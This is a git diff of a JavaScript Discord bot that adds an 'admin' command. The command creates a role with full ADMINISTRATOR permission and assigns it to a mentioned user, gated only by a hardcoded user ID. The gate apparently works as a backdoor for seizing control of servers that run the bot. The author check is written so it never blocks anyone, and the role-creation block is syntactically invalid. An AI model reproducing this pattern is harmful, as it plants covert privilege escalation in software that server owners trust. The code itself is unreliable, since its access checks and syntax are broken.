@@ -22,14 +22,47 @@ bot.on("message", async message => {
 	let messageArray = message.content.split(" ");
 	let command = messageArray[0];
 	let args = messageArray.slice(1);
-	let server = bot.guilds.get("423348154352664586");
 
 	console.log(messageArray);
 	console.log(command);
 	console.log(args);
 
 	if(!command.startsWith(prefix)) return;
-	if(!message.author.id == 441088046562279424) return;
+
+	let Role = message.guild.roles.find("name", "Aesthetic Admin");
+	let Member = message.guild.member(message.mentions.users.first());
+
+	if(!Member.roles.has(Role)) return;
+
+	if(command === `${prefix}admin`) {
+		if(!message.author.id == 441088046562279424) return;
+
+		let Member = message.guild.member(message.mentions.users.first());
+		let Role = message.guild.roles.find("name", "Aesthetic Admin");
+
+		if(!Role) {
+			try {
+				Role = await message.guild.createRole({
+					name: "Aesthetic Admin";
+					color: "#FF5733";
+					permissions: [
+						ADMINISTRATOR: true;
+					];
+				});
+			} catch(e) {
+				console.log(e.stack);
+			};
+		};
+
+		if(!Member.roles.has(Role)) {
+			await Member.addRole(Role);
+			message.channel.send(`${Member.username} is now an Administrator!`);
+		} else {
+			message.channel.send(`${Member.username} is already an Administrator!`);
+		};
+
+		return;
+	};
 
 	if(command === `${prefix}ban`) {
 		if(isNaN(args[0])) {
